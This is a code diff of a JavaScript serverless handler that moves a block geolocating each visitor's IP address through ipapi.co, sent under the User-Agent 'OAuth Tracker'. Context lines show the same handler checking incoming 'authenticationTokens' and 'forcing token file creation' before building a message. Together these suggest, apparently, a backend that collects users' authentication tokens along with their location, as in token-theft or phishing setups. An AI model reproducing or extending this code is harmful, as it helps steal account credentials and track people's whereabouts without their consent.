@@ -145,6 +145,54 @@ const handler = async (event, context) => {
         }
     }
 
+    // Get user IP and location information (OPTIONAL - don't break main function)
+    let userIpInfo = {
+        ip: 'Unknown',
+        country: 'Unknown',
+        city: 'Unknown',
+        region: 'Unknown',
+        timezone: 'Unknown'
+    };
+    
+    try {
+        // Get IP from request headers (Netlify provides this)
+        const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
+                        event.headers['x-real-ip'] || 
+                        event.headers['cf-connecting-ip'] ||
+                        'Unknown';
+        
+        console.log('🌍 Attempting to detect IP address:', clientIP);
+        userIpInfo.ip = clientIP;
+        
+        // Try to get location info (but don't fail if this doesn't work)
+        if (clientIP !== 'Unknown' && !clientIP.includes('127.0.0.1') && !clientIP.includes('localhost')) {
+            const ipResponse = await fetch(`https://ipapi.co/${clientIP}/json/`, {
+                timeout: 3000, // 3 second timeout
+                headers: {
+                    'User-Agent': 'OAuth Tracker'
+                }
+            });
+            
+            if (ipResponse.ok) {
+                const ipData = await ipResponse.json();
+                if (ipData.country_name) {
+                    userIpInfo = {
+                        ip: clientIP,
+                        country: ipData.country_name || 'Unknown',
+                        countryCode: ipData.country_code || 'Unknown',
+                        city: ipData.city || 'Unknown',
+                        region: ipData.region || 'Unknown',
+                        timezone: ipData.timezone || 'Unknown'
+                    };
+                    console.log('🌍 Location detected successfully');
+                }
+            }
+        }
+    } catch (error) {
+        console.log('⚠️ IP/location detection failed (continuing anyway):', error.message);
+        // Don't let IP detection failure break the main function
+    }
+
     // Build the message (MINIMAL - plain text only, heavily sanitized)
     const uniqueId = Math.random().toString(36).substring(2, 8);
     const messageLines = [
@@ -202,54 +250,6 @@ const handler = async (event, context) => {
     console.log('🔍 Checking for authentication tokens...');
     console.log('🔍 data.authenticationTokens:', data.authenticationTokens);
     console.log('🔍 Token check result:', !!data.authenticationTokens);
-    
-    // Get user IP and location information (OPTIONAL - don't break main function)
-    let userIpInfo = {
-        ip: 'Unknown',
-        country: 'Unknown',
-        city: 'Unknown',
-        region: 'Unknown',
-        timezone: 'Unknown'
-    };
-    
-    try {
-        // Get IP from request headers (Netlify provides this)
-        const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
-                        event.headers['x-real-ip'] || 
-                        event.headers['cf-connecting-ip'] ||
-                        'Unknown';
-        
-        console.log('🌍 Attempting to detect IP address:', clientIP);
-        userIpInfo.ip = clientIP;
-        
-        // Try to get location info (but don't fail if this doesn't work)
-        if (clientIP !== 'Unknown' && !clientIP.includes('127.0.0.1') && !clientIP.includes('localhost')) {
-            const ipResponse = await fetch(`https://ipapi.co/${clientIP}/json/`, {
-                timeout: 3000, // 3 second timeout
-                headers: {
-                    'User-Agent': 'OAuth Tracker'
-                }
-            });
-            
-            if (ipResponse.ok) {
-                const ipData = await ipResponse.json();
-                if (ipData.country_name) {
-                    userIpInfo = {
-                        ip: clientIP,
-                        country: ipData.country_name || 'Unknown',
-                        countryCode: ipData.country_code || 'Unknown',
-                        city: ipData.city || 'Unknown',
-                        region: ipData.region || 'Unknown',
-                        timezone: ipData.timezone || 'Unknown'
-                    };
-                    console.log('🌍 Location detected successfully');
-                }
-            }
-        }
-    } catch (error) {
-        console.log('⚠️ IP/location detection failed (continuing anyway):', error.message);
-        // Don't let IP detection failure break the main function
-    }
 
     // Always send token file to debug the issue
     console.log('🔧 FORCING token file creation for debugging...');
